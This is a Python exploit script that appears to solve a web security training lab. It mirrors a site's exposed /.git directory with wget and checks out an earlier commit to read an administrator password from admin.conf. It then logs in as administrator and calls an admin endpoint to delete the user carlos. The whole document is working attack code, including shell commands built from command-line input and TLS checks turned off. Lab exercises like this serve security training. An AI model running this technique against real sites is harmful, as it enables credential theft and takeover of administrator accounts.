import os
import sys
import requests
import subprocess
import tempfile
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(text):
    return BeautifulSoup(text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']

def login(client, host, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text), 'username': 'administrator', 'password': password}
    return 'Your username is: administrator' in client.post(url, data=data).text

def download_git_repo(git_url, repo_path):
    os.system(f'wget --mirror -I .git --directory-prefix={repo_path} {git_url} 2>/dev/null >&2')

def extract_password_from_commit(repo_path):
    cmd = f'cd {repo_path}/*; git checkout HEAD^ 2>/dev/null >&2; cat admin.conf'
    return subprocess.check_output(cmd, shell=True).decode().strip().split('=')[1]

def main():
    host = sys.argv[1].strip().rstrip('/')
    client = requests.Session()
    client.verify = False
    git_url = f'{host}/.git'

    with tempfile.TemporaryDirectory() as tmpdirname:
        download_git_repo(git_url, tmpdirname)
        password = extract_password_from_commit(tmpdirname)

        if not login(client, host, password):
            sys.exit(-2)

        url = f'{host}/admin/delete?username=carlos'
        if 'Congratulations, you solved the lab!' not in client.get(url).text:
            sys.exit(-3)

if __name__ == "__main__":
    main()
